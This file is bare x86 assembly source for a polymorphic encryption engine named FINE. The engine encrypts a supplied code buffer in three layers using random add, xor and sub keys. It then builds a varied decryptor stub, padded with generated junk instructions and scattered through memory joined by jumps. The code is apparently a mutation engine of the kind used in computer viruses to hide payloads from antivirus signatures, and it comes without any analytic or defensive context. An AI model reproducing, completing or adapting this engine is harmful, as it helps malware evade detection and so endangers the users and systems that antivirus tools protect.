MORPHGEN    struct
    rgen_addr           dd      ?
    tgen_addr           dd      ?
    cryptcode_addr      dd      ?
    size_cryptcode      dd      ?
    pa_buf_for_morph    dd      ?
    va_buf_for_morph    dd      ?
    buf_with_morph      dd      ?
    size_morph          dd      ?
    mapped_addr         dd      ?
    reserv1             dd      ?
MORPHGEN    ends

TGEN    struct
    rgen_addr       dd      ?
    buf_for_trash   dd      ?
    size_trash      dd      ?
    regs            dd      ?
    xmask1          dd      ?
    xmask2          dd      ?
    beg_addr        dd      ?
    end_addr        dd      ?
    mapped_addr     dd      ?
    reserv1         dd      ?
TGEN    ends

num_decrypts            equ     3
mtrash1                 equ     0FFFFFFFFh
mtrash2                 equ     000h

num_general_instr       equ     11
size_general_instr      equ     15
num_steps               equ     30
portion                 equ     100
max_portion             equ     portion*num_general_instr+size_general_instr*num_general_instr
min_portion             equ     50

addr1                   equ     000h
addr2                   equ     000h

FINE:
    pushad
    cld
    mov     edx,dword ptr [esp+24h]
    assume  edx:ptr MORPHGEN
    mov     ecx,[edx].size_cryptcode
    mov     esi,[edx].cryptcode_addr
    mov     edi,[edx].pa_buf_for_morph
    xor     eax,eax
    push    eax
    push    [edx].mapped_addr
    push    addr2
    push    addr1
    push    mtrash2
    push    mtrash1
    push    eax;regs
    push    eax;portion
    push    eax;buf_for_trash
    push    [edx].rgen_addr
    mov     ebp,esp
    assume  ebp:ptr TGEN
    mov     eax,num_decrypts
_next_decrypt_:
    push    eax
    call    morph
    mov     esi,edi
    add     edi,ecx
    pop     eax
    dec     eax
    jnz     _next_decrypt_
    add     esp,10*4
    sub     edi,ecx
    mov     [edx].buf_with_morph,edi
    mov     [edx].size_morph,ecx
    mov     dword ptr [esp+1Ch],edi
    mov     dword ptr [esp+18h],ecx
    popad
    ret     4

morph:
    call    gen_reg  
    push    edi
    push    portion
    call    [edx].rgen_addr
    add     eax,41                                   
    call    gen_trash
    push    edi
    push    edi    
    call    instr___call

    call    instr___pop__reg

    call    instr___push__imm

    push    edi
    call    instr___add__reg_imm

    push    edi
    call    instr___mov__reg_imm

    push    edi
    push    edi
    call    instr___addxorsub__addrreg_reg  

    push    edi
    push    edi     
    call    instr___addxorsub__reg_imm 

    call    instr___dec__reg

    call    instr___dec__addresp

    call    instr___pop__reg   
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,ecx
    call    goto_free_addr
    
    add     eax,(max_portion+portion+portion+min_portion)
    add     dword ptr [ebp-16],eax
    pop     eax
    call    gen_trash
    push    -1
    call    [edx].rgen_addr
    xchg    eax,ebx
    push    -1
    call    [edx].rgen_addr
    push    eax
    mov     eax,dword ptr [esi]
    add     esi,4  
_crypt_:
    ;mov        eax,dword ptr [esi]
    cmp     dword ptr [ebp-36],1
    jl      _xor03_                                                         
    jg      _add03_
_sub03_:
    sub     eax,ebx
    jmp     _chg_key1_

_add03_:
    add     eax,ebx
    jmp     _chg_key1_ 

_xor03_: 
    xor     eax,ebx

_chg_key1_:
    cmp     ecx,1
    je      _write_crypt_data_ 
    cmp     dword ptr [ebp-44],1
    jl      _xor04_
    jg      _add04_
_sub04_:
    sub     ebx,dword ptr [esp]
    jmp     _write_crypt_data_

_add04_:
    add     ebx,dword ptr [esp]
    jmp     _write_crypt_data_

_xor04_:
    xor     ebx,dword ptr [esp]
     
_write_crypt_data_:
    mov     dword ptr [edi],eax
    inc     edi
    lodsb
    ror     eax,8
    ;inc        esi
    loop    _crypt_       
    pop     ecx

    pop     eax
    pop     eax
    mov     dword ptr [eax],ecx 

    pop     eax
    pop     eax    
    pop     eax
    mov     dword ptr [eax],ebx

    dec     edi
    xchg    eax,edi
    pop     edi
    pop     esi
    sub     eax,esi
    test    byte ptr [edi-1],20h;0E8h
    je      _addregimm_
_subregimm_:
    neg     eax
_addregimm_: 
    stosd  

    pop     ecx
    pop     edi 
    sub     ecx,edi 
                
    ret

instr___call: 
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    add     eax,dword ptr [esp+8]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    mov     al,0E8h
    stosb
    pop     eax
    stosd
    mov     dword ptr [ebp-20],edi 
    call    gen_trash
    pop     eax
    call    gen_trash 
    
    ret
    
instr___pop__reg:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]  
    call    goto_free_addr
    pop     eax
    call    gen_trash 
    push    2
    call    [edx].rgen_addr
    test    eax,eax
    je      _pop__reg1_
_mov__reg1_addresp___add__esp_4_:
    mov     al,8Bh
    stosb
    mov     al,bh
    shl     eax,3
    add     al,4
    stosb
    mov     al,24h
    stosb
    pop     eax
    call    gen_trash 
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    mov     ax,0C483h
    stosw
    mov     al,04
    jmp     _iprendtrash_ 
_pop__reg1_:
    mov     al,58h
    add     al,bh

_iprendtrash_: 
    stosb
    pop     eax
    call    gen_trash 
    ret

instr___push__imm:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    push    2
    call    [edx].rgen_addr
    test    eax,eax
    je      _push__imm_
_mov__reg2_imm___push__reg2_:
    mov     al,0B8h
    add     al,bl
    stosb 
    mov     eax,ecx
    stosd
    pop     eax
    call    gen_trash
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash  

    mov     al,50h
    add     al,bl
    stosb
    jmp     _ipiendtrash_ 
_push__imm_:
    mov     al,68h
    stosb
    mov     eax,ecx
    stosd

_ipiendtrash_: 
    pop     eax
    call    gen_trash  
    ret 

instr___add__reg_imm:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4] 
    call    goto_free_addr
    pop     eax
    call    gen_trash 
    mov     al,81h
    stosb 
    push    2
    call    [edx].rgen_addr
    imul    eax,28h
    add     al,0C0h
    add     al,bh
    stosb
    mov     dword ptr [ebp-24],edi 
    xor     eax,eax
    stosd 
    pop     eax 
    call    gen_trash 
    ret

instr___mov__reg_imm:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    push    2
    call    [edx].rgen_addr
    test    eax,eax
    je      _mov__reg_imm_

_push__imm___pop__reg_:
    mov     al,68h
    stosb
    mov     dword ptr [ebp-28],edi
    xor     eax,eax
    stosd
    pop     eax
    call    gen_trash 
    push    portion                  
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    mov     al,58h
    add     al,bl
    stosb
    jmp     _mriendtrash_ 

_mov__reg_imm_: 
    mov     al,0B8h
    add     al,bl
    stosb
    mov     dword ptr [ebp-28],edi
    xor     eax,eax
    stosd
_mriendtrash_: 
    pop     eax
    call    gen_trash   
    ret

instr___addxorsub__addrreg_reg:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    mov     dword ptr [ebp-32],edi 
    call    gen_trash
    push    3
    call    [edx].rgen_addr
    mov     dword ptr [ebp-36],eax
    cmp     al,1
    jl      _xor01_
    jg      _sub01_
_add01_: 
    jmp     _n001_
_sub01_:
    mov     al,29h 
    jmp     _n001_
_xor01_:
    mov     al,31h  
_n001_:
    stosb     
    mov     al,bl
    shl     eax,3
    add     al,bh
    stosb 
    pop     eax
    call    gen_trash 
    ret
    
instr___addxorsub__reg_imm:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr 
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash
    mov     al,81h
    stosb 
    push    3
    call    [edx].rgen_addr
    mov     dword ptr [ebp-44],eax
    cmp     al,1
    mov     al,bl
    jl      _xor02_
    jg      _sub02_
_add02_:
    add     al,0C0h
    jmp     _n002_                                  

_sub02_:
    add     al,0E8h
    jmp     _n002_ 

_xor02_:
    add     al,0F0h

_n002_:
    stosb
    mov     dword ptr [ebp-40],edi
    xor     eax,eax 
    stosd
    pop     eax
    call    gen_trash                        
    ret 

instr___dec__reg:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion     
    call    [edx].rgen_addr 
    push    eax
    add     eax,dword ptr [esp+4] 
    call    goto_free_addr
    pop     eax
    call    gen_trash 
    push    2
    call    [edx].rgen_addr
    test    eax,eax
    je      _dec__reg1_

_sub__reg1_1_:
    mov     al,83h
    stosb
    mov     al,0E8h
    add     al,bh
    stosb
    mov     al,1 
    jmp     _idrendtrash_    

_dec__reg1_: 
    mov     al,bh
    add     al,48h
_idrendtrash_:
    stosb
    pop     eax
    call    gen_trash 
    ret

instr___dec__addresp:
    push    portion
    call    [edx].rgen_addr
    push    eax
    push    portion
    call    [edx].rgen_addr
    push    eax
    add     eax,dword ptr [esp+4]
    call    goto_free_addr
    pop     eax
    call    gen_trash 
    push    2
    call    [edx].rgen_addr    
    test    eax,eax
    je      _dec__addresp_

_sub__addresp_1_: 
    mov     eax,01242C83h
    stosd
    jmp     _jne__imm_ 

_dec__addresp_: 
    mov     ax,0CFFh
    stosw
    mov     al,24h
    stosb 

_jne__imm_:
    push    ecx
    mov     ecx,edi 
    mov     ax,850Fh
    stosw 

    sub     ecx,dword ptr [ebp-32]  
    add     ecx,6
    neg     ecx
    xchg    eax,ecx
    stosd 
    pop     ecx 
    pop     eax
    call    gen_trash 
    ret
 
goto_free_addr:
    push    eax
    call    get_free_addr
    push    eax
    jnc     _nojmp_
    push    edi
    sub     edi,eax
    inc     edi
    inc     edi
    mov     eax,edi 
_abs01_: 
    neg     eax 
    js      _abs01_
_jmpshort0xEB_: 
    cmp     eax,80h 
    jae     _jmpnear0xE9_
    neg     edi
    xchg    edi,dword ptr [esp]
    mov     al,0EBh
    stosb
    pop     eax
    stosb
    jmp     _nextgfa_  
    
_jmpnear0xE9_:  
    add     edi,3  
    neg     edi    
    xchg    edi,dword ptr [esp]
    mov     al,0E9h
    stosb 
    pop     eax
    stosd 
_nextgfa_:  
    ;mov        eax,min_portion 
    push    min_portion
    call    [edx].rgen_addr
    call    gen_trash

_nojmp_:
    pop     edi
    pop     eax   
    ret

get_free_addr:
    push    edi 
    push    esi
    push    ecx
    push    eax

_new_addr_:
    push    num_steps
    pop     esi
_find_free_addr_:
    dec     esi
    je      _correct_new_addr_
    push    max_portion
    call    [edx].rgen_addr
    add     eax,dword ptr [ebp-16]
    xchg    eax,edi
    mov     ecx,dword ptr [esp]  
    add     ecx,size_general_instr+5+4+2+min_portion
    xor     eax,eax 
    push    edi   
    repe    scasb
    pop     edi 
    jne     _find_free_addr_
    stosd   
    jmp     _ok_new_addr_   
_correct_new_addr_: 
    add     dword ptr [ebp-16],min_portion;+1      
    jmp     _new_addr_ 
_ok_new_addr_:
    push    edi
    cmp     edi,dword ptr [esp+4+12]
    jle     _jc_ok_
    push    size_general_instr+5+4+2+min_portion  
    pop     ecx
    std
    xor     eax,eax
    repe    scasb
    cld 
    je      _jc_ok_
    cmp     edi,dword ptr [esp+4+12]
    jg      _jc_ok_
    mov     edi,dword ptr [esp+4+12]      
    mov     eax,dword ptr [esp]
    sub     eax,edi
    call    gen_trash
    clc
    jmp     _getfaret_     

_jc_ok_:
    stc  
    
_getfaret_:
    pop     eax
    pop     ecx
    pop     ecx
    pop     esi
    pop     edi  
    ret

gen_trash:
    mov     [ebp].buf_for_trash,edi
    mov     [ebp].size_trash,eax
    mov     [ebp].regs,ebx
    push    ebp  
    call    [edx].tgen_addr
    xchg    eax,edi
    ret 

gen_reg:
_gen_reg1_: 
    call    random_reg
    cmp     al,4
    je      _gen_reg1_
    cmp     al,5
    je      _gen_reg1_
    xchg    eax,ebx
_gen_reg2_:
    call    random_reg
    cmp     al,4
    je      _gen_reg2_
    cmp     al,5
    je      _gen_reg2_
    cmp     al,bl
    je      _gen_reg2_
    mov     bh,al
    ret 
  
random_reg:
    push    8
    call    [edx].rgen_addr
    ret
FINESize    equ     $ - FINE
